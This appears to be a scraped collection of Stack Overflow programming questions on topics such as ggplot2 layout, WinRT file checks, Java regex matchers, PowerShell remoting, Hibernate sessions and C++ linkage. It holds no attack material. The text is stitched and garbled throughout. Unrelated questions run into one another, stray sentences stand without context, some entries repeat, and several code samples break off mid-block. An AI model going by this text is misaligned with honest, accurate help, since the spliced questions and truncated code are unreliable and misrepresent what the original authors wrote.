@CONTENT:Context I want to plot two ggplot2 on the same page with the same legend. http://code.google.com/p/gridextra/wiki/arrangeGrob discribes, how to do this. This already looks good. But... In my example I have two plots with the same x-axis and different y-axis. When the range of the the y-axis is at least 10 times higher than of the other plot (e.g. 10000 instead of 1000), ggplot2 (or grid?) does not align the plots correct (see Output below). Question How do I also align the left side of the plot, using two different y-axis? Example Code x = c(1, 2)
y = c(10, 1000)
data1 = data.frame(x,y)
p1 <- ggplot(data1) + aes(x=x, y=y, colour=x) + geom_line()

y = c(10, 10000)
data2 = data.frame(x,y)
p2 <- ggplot(data2) + aes(x=x, y=y, colour=x) + geom_line()


# Source: http://code.google.com/p/gridextra/wiki/arrangeGrob
leg <- ggplotGrob(p1 + opts(keep="legend_box"))
legend=gTree(children=gList(leg), cl="legendGrob")

 But how can it be done from eclipse? EDIT: I edited the .classpath entry in my project floder as: <?xml version="1.0" encoding="UTF-8"?>

@TITLE:Check if a file exists in the project in WinRT
@CONTENT:I have a WinRT Metro project which displays images based on a selected item. However, some of the images selected will not exist. What I want to be able to do is trap the case where they don't exist and display an alternative. Here is my code so far: internal string GetMyImage(string imageDescription)
{
    string myImage = string.Format("Assets/MyImages/{0}.jpg", imageDescription.Replace(" ", ""));

    // Need to check here if the above asset actually exists

    return myImage;
}
 Example calls: GetMyImage("First Picture");
GetMyImage("Second Picture");
 So Assets/MyImages/SecondPicture.jpg exists, but Assets/MyImages/FirstPicture.jpg does not. At first I thought of using the WinRT equivalent of File.Exists(), but there doesn't appear to be one. Without having to go to the extent of trying to open the file and catching an error, can I simply check if either the file exists, or the file exists in the project?
@CODE:internal string GetMyImage(string imageDescription)
{
    string myImage = string.Format("Assets/MyImages/{0}.jpg", imageDescription.Replace(" ", ""));

I'd hate to have to hard code paths in the script. I'd much rather figure out the path programatically. Any suggestions welcome. EDIT: I am not using the Dropbox API in the script, the script simply reads files in a specific Dropbox folder shared between the users. The only thing I need is the path to the Dropbox folder, as I of course already know the relative path within the Dropbox file structure. EDIT: If it matters, I am using Windows 7.

@TITLE:Detecting noise via mic while playing a song on iPhone
@CONTENT:I am making an app that should play a simple audio track and let me know if there is any noise in the vicinity while the track is playing. This is done by doing a live recording from the microphone while the song plays on the iPhone's loudspeaker. Any sound that is not part of the music playing is defined as noise. What would be the simplest way to implement this functionality? I've researched it quite extensively online but I have not been able to find anything that points me to a solution for this specific problem. Although it may be a combination of different techniques I read about that eventually will be the solution. Things I've already implemented Playing the song and recording audio simultaneously. Things I've tried NOTE: Since we're encouraged to add what we've already tried I add the following part. But I'm by no means saying that this is the right way to solve the problem, it's just something I tried. I hacked the aurioTouch2 sample application: what I did was playback the song once and record the fast fourier transform values (at a pretty low sample rate to keep the amount of recorded data low). Then when the track was played again I would basically calculate (per timestep) the correlation coefficient between the output graphs that are constructed using the live playback fft data and the recorded fft data (so the 'squiggly' lines that you see when you put the app in fft mode). This 'sort of' works. The correlation coefficient is clearly lower when excess sound/noise is in the room but it isn't very sensitive and also depends on the volume level that was used when recording the fft data. In the end I'm thinking that this may not be the best approach. Does anyone think this is possible? If so, what would be the best approach? Please ask if you need more clarification!

@TITLE:Java Pattern Matcher: create new or reset?
@CONTENT:Assume a Regular Expression, which, via a Java Matcher object, is matched against a large number of strings: String expression = ...; // The Regular Expression
Pattern pattern = Pattern.compile(expression);
String[] ALL_INPUT = ...; // The large number of strings to be matched

Matcher matcher; // Declare but not initialize a Matcher

    }
}
 In the Java SE 6 JavaDoc for Matcher, one finds the option of reusing the same Matcher object, via the reset(CharSequence) method, which, as the source code shows, is a bit less expensive than creating a new Matcher every time, i.e., unlike above, one could do: String expression = ...; // The Regular Expression
Pattern pattern = Pattern.compile(expression);
String[] ALL_INPUT = ...; // The large number of strings to be matched

Matcher matcher = pattern.matcher(""); // Declare and initialize a matcher

    matcher.reset(input); // Reuse the same matcher

    if (matcher.matches()) // Or whatever other matcher check
    {

 Should one use the reset(CharSequence) pattern above, or should they prefer to initialize a new Matcher object every time?

@TITLE:How do I include a locally defined function when using PowerShell's Invoke-Command for remoting?
@CONTENT:I feel like I'm missing something that should be obvious, but I just can't figure out how to do this. I have a ps1 script that has a function defined in it. It calls the function and then tries using it remotely: function foo
{
    Param([string]$x)

    Write-Output $x
}

foo "Hi!"

Invoke-Command -ScriptBlock { foo "Bye!" } -ComputerName someserver.example.com -Credential someuser@example.com
 This short example script prints "Hi!" and then crashes saying "The term 'foo' is not recognized as the name of a cmdlet, function, script file, or operable program." I understand that the function is not defined on the remote server because it is not in the ScriptBlock. I could redefine it there, but I'd rather not. I'd like to define the function once and use it either locally or remotely. Is there a good way to do this?
@CODE:function foo

    Param([string]$x)

    Write-Output $x
}

foo "Hi!"

@TITLE:Creating JSON objects directly from model classes in Java
@CONTENT:I have some model classes like Customer, Product, etc. in my project which have several fields and their setter-getter methods, I need to exchange objects of these classes as a JSONObject via Sockets to and from client and server. Is there any way I can create JSONObject directly from the object of model class such that fields of the object become keys and values of that model class object become values for this JSONObject. Example: Customer c = new Customer();
c.setName("Foo Bar");
c.setCity("Atlantis");
.....
/* More such setters and corresponding getters when I need the values */
.....
 And I create JSON Object as: JSONObject jsonc = new JSONObject(c); //I'll use this only once I'm done setting all values.
 Which gets me something like: {"name":"Foo Bar","city":"Atlantis"...}
 Please note that, in some of my model classes, certain properties are itself an object of other model class. Such as: Product p = new Product();
p.setName("FooBar Cookies");
p.setProductType("Food");
c.setBoughtProduct(p);
 In a case like above, as I'd expect, the yielded JSON object would be: {"name":"Foo Bar","city":"Atlantis","bought":{"productname":"FooBar Cookies","producttype":"food"}}
 I know I could create something like toJSONString() in each model class and have the JSON-friendly string created and manipulate it then, but in my previous experiences of creating RESTful service in Java (which is totally out of context for this question), I could return JSON string from the service method by using @Produces(MediaType.APPLICATION_JSON) and have the method returning object of model class. So it produced JSON string which I could consume at the client end. I was wondering if its possible to get similar behavior in current scenario. Any help or suggestion is appreciated. Thanks.
@CODE:Customer Product JSONObject Customer c = new Customer();
c.setName("Foo Bar");
c.setCity("Atlantis");

@CONTENT:As we all know the stopwatch might have issues in a multi-threaded async application that will be running on all cores. On a multiprocessor computer, it does not matter which processor the thread runs on. However, because of bugs in the BIOS or the Hardware Abstraction Layer (HAL), you can get different timing results on different processors. To specify processor affinity for a thread, use the ProcessThread.ProcessorAffinity method. Are there any way for me to get some reliable tick/timestamp like values that has high resolution/accuracy as well is consistent across cpu cores? If not possible to make the stopwatch(QueryPerformanceCounter) multi-core safe, what is the next best way to get a good timestamp across cores? DateTime.UtcNow.Ticks or Environment.TickCount? Any other counters? I do need better resolution than what DateTime.UtcNow.Ticks can provide. (10-15ms)

@TITLE:Java Pattern Matcher: create new or reset?
@CONTENT:Assume a Regular Expression, which, via a Java Matcher object, is matched against a large number of strings: String expression = ...; // The Regular Expression
Pattern pattern = Pattern.compile(expression);
String[] ALL_INPUT = ...; // The large number of strings to be matched

 In the Java SE 6 JavaDoc for Matcher, one finds the option of reusing the same Matcher object, via the reset(CharSequence) method, which, as the source code shows, is a bit less expensive than creating a new Matcher every time, i.e., unlike above, one could do: String expression = ...; // The Regular Expression

@TITLE:Multicore and thread aware .Net stopwatch?
@CONTENT:As we all know the stopwatch might have issues in a multi-threaded async application that will be running on all cores. On a multiprocessor computer, it does not matter which processor the thread runs on. However, because of bugs in the BIOS or the Hardware Abstraction Layer (HAL), you can get different timing results on different processors. To specify processor affinity for a thread, use the ProcessThread.ProcessorAffinity method. Are there any way for me to get some reliable tick/timestamp like values that has high resolution/accuracy as well is consistent across cpu cores? If not possible to make the stopwatch(QueryPerformanceCounter) multi-core safe, what is the next best way to get a good timestamp across cores? DateTime.UtcNow.Ticks or Environment.TickCount? Any other counters? I do need better resolution than what DateTime.UtcNow.Ticks can provide. (10-15ms)

@LINK:/questions/9220028/dot-syntax-vs-method-syntax-with-getter
@TITLE:dot syntax vs method syntax with getter=
@CONTENT:I'm not sure how much use this question is but it seems interesting to me... I thought that using property/synthesize statements was equivalent to me creating the getter/setter. Therefore // .h
@property (nonatomic) BOOL on;

// .m
@synthesize on = _on;

// In my mind synthesizes the following methods

// - (BOOL)on;
// - (void)setOn:(BOOL)on;
 However if I change the declarations to the following:                               v
@property (nonatomic, getter=isOn) BOOL on;

@synthesize on = _on;

// In my mind synthesizes the following

// - (BOOL)isOn;
// - (void)setOn:(BOOL)on;
 Then given the above I override the getter so I know when it is called: - (BOOL)isOn;
{
    NSLog(@"I was called");
    return _on;
}
 Now calling the following on an instance (myClass) results in: NSLog(@"%d", [myClass isOn]);

//=> 2012-02-09 22:18:04.818 Untitled[1569:707] I was called
//=> 2012-02-09 22:18:04.820 Untitled[1569:707] 1

NSLog(@"%d", myClass.isOn);

//=> 2012-02-09 22:18:24.859 Untitled[1599:707] I was called
//=> 2012-02-09 22:18:24.861 Untitled[1599:707] 1

NSLog(@"%d", myClass.on);         // This is the one I didn't expect to work

//=> 2012-02-09 22:18:55.570 Untitled[1629:707] 1
 I had always assumed that if I was using a property in this sense it was perfectly valid to use the getter/setter with dot syntax in the form myClass.isOn;
myClass.on = on;
 From another question it was suggested that when using dot syntax I should use the property name like this: myClass.on   // Correct
myClass.isOn // Incorrect
 Although this works it seem slightly less logical because I know there is no underlying method - (BOOL)on it is instead mapped to - (BOOL)isOn My questions are (using the latter example) Is this a bug or should myClass.on really be silently changed to call - (BOOL)isOn Semantically speaking I am accessing state not invoking behaviour so is my current use of dot syntax correct? (e.g. myClass.isOn) Update Although no one has explicitly said it I have reasoned that using .isOn is bad form because regardless of the fact that under the hood the same method is called, semantically isOn is asking a question, which is more behaviour rather than state. However I am still unclear on where the "magic" wiring goes on that turns calls to myClass.on into [myClass isOn] Update 2 After looking around the docs some more I found this section on Declared Properties. Using the following code I can inspect a class' properties: id MyClass = objc_getClass("MyClass");
unsigned int outCount, i;

objc_property_t *properties = class_copyPropertyList(MyClass, &outCount);
for (i = 0; i < outCount; i++) {
    objc_property_t property = properties[i];
    NSLog(@"Name: %s, attributes: %s\n", property_getName(property), property_getAttributes(property));
}

//=> 2012-02-10 07:10:28.333 Untitled[934:707] Name: on, attributes: Tc,GisOn,V_on
 So we have the following attributes: name = on type = char (Tc) getter = isOn (GisOn) variable = _on (V_on) With all of this information available at runtime it kind of leaves the question is this lookup done at runtime or compile time like some answers suggest?
@CODE:// .h
@property (nonatomic) BOOL on;

// .m
@synthesize on = _on;

// In my mind synthesizes the following methods

// - (BOOL)on;

@synthesize on = _on;

// In my mind synthesizes the following

// - (BOOL)isOn;
// - (void)setOn:(BOOL)on; - (BOOL)isOn;
{
    NSLog(@"I was called");
    return _on;
} myClass NSLog(@"%d", [myClass isOn]);

@TITLE:Is it possible to use multiple ehcache.xml (in different projects, same war)?
@CONTENT:I have a services project and a web project. I need to have eh-cache in both projects. The idea is that if the service project is updated, it's cache-related changes (like keys and invalidation rules) will also be available, while no changes are made to the web project. Being so independent, the service project can also be used with another projects without them even knowing of eh-cache. At this point, my web project also uses eh-cache for its own purposes. I am not much experienced with eh-cache and I fear that the two projects might clash when deployed together. I also did not find relevant information on eh-cache site. Can you provide me some information how to best configure the two projects, so that I can achieve the above requirements? Edit: I am using Spring, therefore I will prefer to use it for my cache managers. I am using the following in the context.xml for each jar with ehcache, for instance for jar 1 I have: <ehcache:annotation-driven cache-manager="ehCacheManager1" />

<bean id="ehCacheManager1" class="org.springframework.cache.ehcache.EhCacheManagerFactoryBean">
    <property name="configLocation" value="classpath:ehcache-1.xml" />
</bean>
 and for jar 2 I have <ehcache:annotation-driven cache-manager="ehCacheManager2" />

<bean id="ehCacheManager2" class="org.springframework.cache.ehcache.EhCacheManagerFactoryBean">
    <property name="configLocation" value="classpath:ehcache-2.xml" />
</bean>
 So, will both caches be up and working? I fear the ehcache:annotation-driven will get overridden by the last read context and only one cache will be operational. Am I wrong, or missing something?

<bean id="ehCacheManager1" class="org.springframework.cache.ehcache.EhCacheManagerFactoryBean">

I fix most of those errors by: Right click on the project>properties>Java Compiler>compiler compliance level: and I set it to 1.6. This forces a re-build and suddenly I am down to just 54 errors. Most of them are "R cannot be resolved to a variable" but the last 5 are all "the import com.actionbarsherlock.R cannot be resolved". I have searched around and the common ways of solving this worked out as follows: "Make sure your resources are not in error" -- I checked and there are no problems with anything in the /res folder "Make sure you aren't importing android.R" -- I am not. I have: import com.actionbarsherlock.R
 It occurred to me that the package name might be incorrect, but it isn't. "Simply clean the project" -- Have done this many times to no effect "Make sure eclipse is able to generate R files at all" -- It can in the blank test project I made just now And some other fixes which are more specific to ActionBarSherlock: "Make sure your targetSDK is 11 or higher" -- It is set to 13 "Make sure the project is a library project" -- It is How can I get rid of these errors?

 This is obvious, because variable one does not return null. Is if (one.length() > 0) {}

@TITLE:Using hashlib to compute md5 digest of a file in Python 3
@CONTENT:With python 2.7 the following code computes the mD5 hexdigest of the content of a file. (EDIT: well, not really as answers have shown, I just thought so). import hashlib

def md5sum(filename):
    f = open(filename, mode='rb')
    d = hashlib.md5()
    for buf in f.read(128):
        d.update(buf)
    return d.hexdigest()
 Now if I run that code using python3 it raise a TypeError Exception:     d.update(buf)
TypeError: object supporting the buffer API required
 I figured out that I could make that code run with both python2 and python3 changing it to: def md5sum(filename):
    f = open(filename, mode='r')
    d = hashlib.md5()
    for buf in f.read(128):
        d.update(buf.encode())
    return d.hexdigest()
 Now I still wonder why the original code stopped working. It seems that when opening a file using the binary mode modifier it returns integers instead of strings encoded as bytes (I say that because type(buf) returns int). Is this behavior explained somewhere ?
@CODE:import hashlib

def md5sum(filename):

@TITLE:Programmatically change the Windows Shell
@CONTENT:I'm working on a project that will be "embedded" into a Windows 7 system, this is going to be achieved by disabling task manager and changing the windows shell to the application, as well as other things. What I'm looking to do here is programmatically change the Windows shell between the application and explorer.exe, I would like to know if there's any way to do this in C#. Currently I have a few lines of code that attempt to change the registry entry for the Windows Shell, but nothing appears to happen after refreshing the Registry Editor, the code looks like this:     regKey = Registry.LocalMachine.OpenSubKey("SOFTWARE", true).OpenSubKey("Microsoft", true).OpenSubKey("Windows NT", true).OpenSubKey("CurrentVersion", true).OpenSubKey("Winlogon", true);
    regKey.DeleteValue("Shell");
    regKey.SetValue("Shell", shell);
    regKey.Close();
 I've tried restarting windows to see if that allows the shell change to complete, but to no avail. I'd greatly appreciate it if someone can tell me if it's even possible to do it programmatically, and where I'm going wrong with it. Also, I'd be grateful to know if there's a way to code the program so that it's always running with admin privileges so that registry editing will work. Many Thanks, Richard

@TITLE:Get web application assembly name, regardless of current executing assembly
@CONTENT:Is is possible to get the assembly name of an ASP.NET web application, from a referenced assembly?? Assembly.GetEntryAssembly worked fine in desktop and console apps but it seems to be always null in web apps, and GetExecuting\GetCallingAssebly return my referenced assembly, not the one from the web app. Long explanation: I wrote a custom Settings Provider, that instead of reading configuration from the app config file, it gets the settings from a centralized configuration service. The custom provider is in a separate assembly so it can be used by the different applications. The ApplicationName property needs to be overriden with the app assembly name. The way to use the provider is though a .net custom attribute, so I can't send any params to it. Since non of the Assembly.Get*Assembly methods seem to work, the only thing a I can think of is requiring an appSetting with the app name for web apps, but I'm not really happy with that. Any help with this is appreciated, thanks!

@TITLE:How to set auto-margin boxes in flexible-width design using CSS?
@CONTENT:I have DIV with flexible width set e.g. min-width:800px and max-width:1400px. In this DIV, there are many boxes with fix width 200px and display:inline-block. So depending on parent DIV width, these boxes fill the entire space. My problem is the blank space on the right side which is caused by variable width of the parent div. Sometimes this blank space is small and looks fine, but with different widths of the parent div, this blank space is almost 200px. I don't know, if I described my problem in enough detail, I hope this picture will help to describe my actual situation: And this is what I would like to have: This auto-margin could be easily achieved by using TABLE. However, I don't know the exact number of columns, since it depends on user's screen resolution. So I can't use table and rather stick with CSS. Anyone has an idea how to solve this ? Thank you in advance for your comments and answers. EDIT: I don't need support of IE6. I would like to support IE7, but IE7 is optional as I know there are limitations so I will probably use fixed width of "div.wrapper" in IE7 EDIT2 I need to handle multiple rows of these boxes, so they don't exceed the "div.wrapper" box and wrap correctly in multiple lines of boxes, not just in one long line. EDIT3 I don't know the number of "columns" as this is very variable depending on user's screen resolution. So on big screen there could be 7 boxes in one row, and on small screens there could be just 4 boxes in one row. So I need solution that doesn't set fixed number of boxes in one row. Instead, when the boxes don't fit in one row, they should just wrap to a next row.

@TITLE:image map not working on iOS devices, with large images that get rescaled by the device
@CONTENT:I'm developing an internal web app on our company intranet using PHP. One section of the app displays a couple of high resolution images to the user. These images are in the region of 5000x3500 pixels. Each image has an image map (using rectangular areas), and all works fine in the desktop browsers I've tried. The problem I'm finding, is that when users access the site via their iOS devices, the images are being rescaled by safari on the device, however the image map coordinates are not being adjusted to match. An example of the HTML being generated by my PHP is as follows: <img src="largeimage.jpg" width="5000" height="3500" usemap="#examplemap">
<map name="examplemap">
  <area shape="rect" coords="0,0,5000,500" href="blah1"/>
  <area shape="rect" coords="0,500,2500,3500" href="blah2"/>
  <area shape="rect" coords="2500,500,5000,3500" href="blah3"/>
</map>
 (The actual rectangle coordinates in the image map are calculated as a percentage of the image size). I know that safari is resizing the image due to memory constraints on the device, but I need to either find a way of scaling the image map to suit, or replacing the image map with something else that will do the same job. Can anyone offer any advise?

@TITLE:function declaration faster than function expression?
@CONTENT:The difference b/w function declaration & function expression is beautifully described in Javascript: var functionName = function() {} vs function functionName() {} In this it's mentioned that function declaration is evaluated during parse-time, & function expression is evaluated in the execution-phase In bytes.com it's mentioned that function declaration is faster than function expression. I created a basic test case for this: http://jsperf.com/function-declaration-vs-function-expression Function Declaration: function myfunc() {
 alert("yo");
}
myfunc();
 Function Expression: var myfunc = function() {
 alert("yo");
}
myfunc();
 The test showed that function expression is 90% slower than function declaration. Why such a difference in speed? Edit: From the results in http://jsperf.com/function-declaration-vs-function-expression In Chrome, IE9, Opera & Safari -> Function Declaration is faster than Function Expression In Firefox, IE7, IE8 -> Function Expression is faster than Function Declaration In IE9 Function declaration is faster, whereas in IE 7 & 8 function expression is faster. Is it because of change in JavaScript engine in IE9, or was this move intentional?

@TITLE:C++'s ¡§inline¡¨ - how strong a hint is it for GCC and Clang/LLVM?
@CONTENT:In C++, the keyword "inline" serves two purposes. First, it allows a definition to appear in multiple translation units. Second, it's a hint to the compiler that a function should be inlined in the compiled code. My question: in code generated by GCC and Clang/LLVM, does the keyword "inline" have any bearing on whether a function is inlined? If yes, in what situations? Or is the hint completely ignored? Note this is a not a language question, it is a compiler-specific question.

@CONTENT:I'm making a really simple email validation script that basically just checks the following that the email isn't blank the the email contains an @ symbol with at least 1 character before it that there is a domain ie @ with at least 2 letters after it that it ends with a fullstop with at least 2 letters after it I know there are many more checks, but I look at these regex rules and my mind stops working. I figure if I started with something small like this I might be able to wrap my brain around more complex rules. Currently using some jquery I do the following:  var booking_email = $('input[name=booking_email]').val();

 if(booking_email == '' || booking_email.indexOf('@') == -1 || booking_email.indexOf('.') == -1) {

   // perform my alert

 }
 This is enough to stop 90% of bogus emails so far... I would just like to make it a bit more effective because currently my rule will allow emails like '@domain.com' or 'user@domain.' because it only checks that there is a fullstop and an @ symbol. Thanks for any tips.

@TITLE:Why can't templates be within extern ¡§C¡¨ blocks?
@CONTENT:This is a follow-up question to an answer to Is it possible to typedef a pointer-to-extern-¡§C¡¨-function type within a template? This code fails to compile with g++, Visual C/C++, and Comeau C/C++ with basically the same error message: #include <cstdlib>

extern "C" {
    static int do_stuff(int) {
        return 3;
    }

    template <typename return_t_, typename arg1_t_>
    struct test {

    };
}

int main()
{
    test<int, int>::foo(&do_stuff);
    return EXIT_SUCCESS;
}
 g++ says "error: template with C linkage", Visual C/C++ emits compiler error C2894, and Comeau C/C++ says "error: this declaration may not have extern "C" linkage". The thing is, all are happy with: #include <cstdlib>

extern "C" {
    static int do_stuff(int) {
        return 3;
    }

    struct test {
        static void foo(int (*)(int)) { }
    };
}

int main()
{
    test::foo(&do_stuff);
    return EXIT_SUCCESS;
}
 Section 7.5, Linkage specifications, of the C++ Standard states: A C language linkage is ignored for the names of class members and the member function type of class member functions. And it even gives the example: extern "C" {
    class X {
        void mf(); // the name of the function mf and the member
                // function's type have C++ language linkage
        void mf2(void(*)()); // the name of the function mf2 has C++ language
                // linkage; the parameter has type pointer to C function
    };
}
 If templates were allowed in extern "C" blocks, then the member functions of the instantiations would have C++ linkage. Why, then, does chapter 14, Templates, of the C++98 Standard state: A template name may have linkage (3.5). A template, a template explicit specialization (14.7.3), and a class template partial specialization shall not have C linkage. What does it mean that a template "may" have linkage? What is template linkage? Why is it explicitly forbidden to have a template with C linkage, when a class is okay, and all member functions of instantiations of the template (the default constructor, destructor, and assignment operator overload) would have C++ linkage?
@CODE:g++ #include <cstdlib>

extern "C" {
    static int do_stuff(int) {
        return 3;
    }

    template <typename return_t_, typename arg1_t_>

@CONTENT:I have a VS 2010 C# .NET 4 project. The issue is that the program is not breaking on 'NullReferenceException' errors during debugging. The output window will display the following: A first chance exception of type 'System.NullReferenceException' occurred in myProgram.exe ...but the debugger will just exit out of the function and continue running the rest of the program. How do I change this behavior so that the debugger will break on these exceptions?

@TITLE:find and replace string in a file
@CONTENT:I'm trying to find and replace a string in a folder of files. Could someone possibly help me? My script is as follows: #!/bin/bash
OLD="This is a"
NEW="I am a"
DPATH="/home/user/test/*.txt"
BPATH="/home/user/test/backup/foo"
[ ! -d $BPATH ] && mkdir -p $BPATH || :
for f in $DPATH
do
  if [ -f $f -a -r $f ]; then
    /bin/cp -f $f $BPATH
    sed "s/$OLD/$NEW/g" "$f"
   else
    echo "Error: Cannot read $f"
  fi
done
 Now this seems to find the string 'This is a' and replaces with 'I am a', but this only prints to screen. I need it to replace in the files themselves. Thanks

@TITLE:visual studio C++ toggle comment ? comment while not whole line is selected?
@CONTENT:2 questions actually : 1) shortcut to toggle comment on selected lines ? Available on all iDEs I used starting with notepad++ 2)the ctrl-k, ctrl-c exhibits this behavior (quoted from someplace nicely worded): C#: Each line where some text is selected is commented at the line-start with double-slash. If nothing is selected, the line where the cursor is is commented. C++: If nothing is selected or complete lines are selected, it behaves as above. However, if parts of a line are selected, and no comment is selected as part of the selection (ex. select something in the middle of a code line), then the selection is surrounded by /* and */. since I code in C++ I find this behavior annoying - I want to be able to comment out lines partially selected - any workarounds ?

@LINK:/questions/4343850/variable-length-array-overhead-in-c
@TITLE:Variable Length Array overhead in C++?
@CONTENT:Looking at this question: Why does a C/C++ compiler need know the size of an array at compile time ? it came to me that compiler implementers should have had some times to get their feet wet now (it's part of C99 standard, that's 10 years ago) and provide efficient implementations. However it still seems (from the answers) to be considered costly. This somehow surprises me. Of course, I understand that a static offset is much better than a dynamic one in terms of performance, and unlike one suggestion I would not actually have the compiler perform a heap allocation of the array since this would probably cost even more [this has not been measured ;)] But I am still surprised at the supposed cost: if there is no VLA in a function, then there would not be any cost, as far I can see. if there is one single VLA, then one can either put it before or after all the variables, and therefore get a static offset for most of the stack frame (or so it seems to me, but I am not well-versed in stack management) The question arise of multiple VLAs of course, and I was wondering if having a dedicated VLA stack would work. This means than a VLA would be represented by a count and a pointer (of known sizes therefore) and the actual memory taken in an secondary stack only used for this purpose (and thus really a stack too). [rephrasing] How VLAs are implemented in gcc / VC++ ? Is the cost really that impressive ? [end rephrasing] It seems to me it can only be better than using, say, a vector, even with present implementations, since you do not incur the cost of a dynamic allocation (at the cost of not being resizable). EDIT: There is a partial response here, however comparing VLAs to traditional arrays seem unfair. If we knew the size beforehand, then we would not need a VLA. In the same question AndreyT gave some pointers regarding the implementation, but it's not as precise as I would like.

 But, most browsers will accept it you just write "CHECKED" and don't give it a value. So, what if you do include the attribute, are there any values that would be (consistently) considered false?

@TITLE:Safely parsing a JSON string with unquoted keys
@CONTENT:json2.js is strict requiring all object keys be double-quoted. However, in Javascript syntax {"foo":"bar"} is equivalent to {foo:"bar"}. I have a textarea that accepts JSON input from the user and would like to "ease" the restriction on double quoting the keys. I've looked at how json2.js validates a JSON string in four stages before it evals it. I was able to add a 5th stage to allow unquoted keys and would like to know if there are any security implications to this logic. var data = '{name:"hello", age:"23"}';

// Make sure the incoming data is actual JSON
// Logic borrowed from http://json.org/json2.js
if ( /^[\],:{}\s]*$/.test(data.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g, "@")
     .replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g, "]")
     .replace(/(?:^|:|,)(?:\s*\[)+/g, ":") // EDITED: allow key:[array] by replacing with safe char ":"
     /** everything up to this point is json2.js **/

     /** this is the 5th stage where it accepts unquoted keys **/         
     .replace(/\w+\s*\:/g, ":")) ) { // EDITED: allow any alphanumeric key

  console.log( (new Function("return " + data))() );

 This runs fine the first time, but if I run it again it fails on the last line there with "Duplicate key on write or update". Is there a way I can do sort of a ADD CONSTRAINT IF NOT EXISTS or something like that? Like I can do with the CREATE TABLE query?

@TITLE:is hibernate's session thread safe
@CONTENT:i need to know, whether the hibernate's session is thread safe or not. But obvious a new session is attached to every thread for execution. But my question is if in one thread i have updated some value of an entity, so will that be reflected in other thread during same time execution?... My problem is when i fire update from two threads sequentially, the value is updated properly but when when i fire the update almost altogether then it fails. for eg. current stage of table.     ID NAME            MARKS
---------- ---------- ----------
         1 John               54
 i am trying to do follwing :- Student student = session.load(Student.class, 1);
student.setMarks(student.getMarks() + 1);
session.update(student);
session.close();
 when i try to run the above code in loop say 10, then value of "marks" in table "student" is properly updated i.e. the value gets updated to 64 which is proper. But when i try to run the same code in threaded environment, it gives bad results. Please help.

So, I initially tried the ksoap2 library and the proper url and got the same result. I suspect I have some bad setting either in my app or in my emulator. can you give me some pointers on where to look? it would also bee useful a working example of something similar. then i could check and if the problem persists i would know that is my development setup at fault. btw, i am using mac snow leopard with eclipse and android 2.2 as a setup thanks regards

@TITLE:Using Numpy Vectorize on Functions that Return Vectors
@CONTENT:numpy.vectorize takes a function f:a->b and turns it into g:a[]->b[]. This works fine when a and b are scalars, but I can't think of a reason why it wouldn't work with b as an ndarray or list, i.e. f:a->b[] and g:a[]->b[][] For example: import numpy as np
def f(x):
    return x * np.array([1,1,1,1,1], dtype=np.float32)
g = np.vectorize(f, otypes=[np.ndarray])
a = np.arange(4)
print(g(a))
 This yields: array([[ 0.  0.  0.  0.  0.],
       [ 1.  1.  1.  1.  1.],
       [ 2.  2.  2.  2.  2.],
       [ 3.  3.  3.  3.  3.]], dtype=object)
 Ok, so that gives the right values, but the wrong dtype. And even worse: g(a).shape
 yields: (4,)
 So this array is pretty much useless. I know I can convert it doing: np.array(map(list, a), dtype=np.float32)
 to give me what I want: array([[ 0.,  0.,  0.,  0.,  0.],
       [ 1.,  1.,  1.,  1.,  1.],
       [ 2.,  2.,  2.,  2.,  2.],
       [ 3.,  3.,  3.,  3.,  3.]], dtype=float32)
 but that is neither efficient nor pythonic. Can any of you guys find a cleaner way to do this? Thanks in advance!

def f(x):
    return x * np.array([1,1,1,1,1], dtype=np.float32)

@TITLE:Segfaults in malloc() and malloc_consolidate()
@CONTENT:My application segfaults sometimes and mainly in malloc() and malloc_consolidate() when I look at the backtrace in gdb. I verified that the machine has enough memory available, it didn't even start swapping. I checked ulimits for data segement and max memory size and both are set to 'unlimited'. I also ran the application under valgrind and didn't find any memory errors. Now I'm out of ideas what else might be causing these segfaults. Any Ideas ? Update: Since I'm not finding anything with valgrind (or ptrcheck), could it be that another application is trashing libc's memory structure or is there a separate structure for each process ?

@TITLE:How to check null element if it is integer array in Java?
@CONTENT:I'm quite new to Java and having an issue checking null element in integer array. I'm using Eclipse for editor and the line that checks null element is showing error: Line that complains: if(a[i] != null) {
 Error msg from Eclipse: The operator != is undefined for the argument type(s) int, null
 In PHP, this works without any problem but in Java it seems like I have to change the array type from integer to Object to make the line not complain (like below) Object[] a = new Object[3];
 So my question is if I still want to declare as integer array and still want to check null, what is the syntax for it? Code: public void test() {
        int[] a = new int[3];
        for(int i=0; i<a.length; i++) {
            if(a[i] != null) { //this line complains...
                System.out.println('null!');
            }
        }
    }
@CODE:if(a[i] != null) { The operator != is undefined for the argument type(s) int, null Object[] a = new Object[3]; public void test() {
        int[] a = new int[3];

@CONTENT:I've seen people here made comments like "regex is too slow!", or "why would you do something so simple using regex!" (and then present a 10+ lines alternative instead), etc. I haven't really used regex in industrial setting, so I'm curious if there are applications where regex is demonstratably just too slow, AND where a simple non-regex alternative exists that performs significantly (maybe even asymptotically!) better. Obviously many highly-specialized string manipulations with sophisticated string algorithms will outperform regex easily, but I'm talking about cases where a simple solution exists and significantly outperforms regex. What counts as simple is subjective, of course, but I think a reasonable standard is that if it uses only String, StringBuilder, etc, then it's probably simple. Note: I would very much appreciate answers that demonstrate the following: a beginner-level regex solution to a non-toy real-life problem that performs horribly the simple non-regex solution the expert-level regex rewrite that performs comparably

@CONTENT:I've been having a dilemma for a while now, so I said I'd see what you guys thing before I rest my case. Ever since I started playing with MySQL I was building query how I though was "the right way", with backticks. Example: SELECT `title` FROM `table` WHERE ( `id` = 3 )
 As opposed to: SELECT title FROM table WHERE ( id = 3 )
 I think I got this practice from the Phpmyadmin exports, and from what I understood, even Rails generates its queries like this. But nowadays I see less and less queries build like this, and also, it seems the code seems messier and more complicated with backticks in queries. Even with SQL helper functions things would be simpler without them; so this is why I'm considering leaving them behind. But first, I wanted to find out if there is other implication in this practice that should affect my decision, such as SQL (MySQL in my case) interpretation speed, etc. So what do you think?

@LINK:/questions/1066681/can-c-arrays-contain-padding-in-between-elements
@TITLE:Can C arrays contain padding in between elements?
@CONTENT:I heard a rumor that, in C, arrays that are contained inside structs may have padding added in between elements of the array. Now obviously, the amount of padding could not vary between any pair of elements or calculating the next element in an array is not possible with simple pointer arithmetic. This rumor also stated that arrays which are not contained in structures are guaranteed to contain no padding. I know at least that part is true. So, in code, the rumor is: {
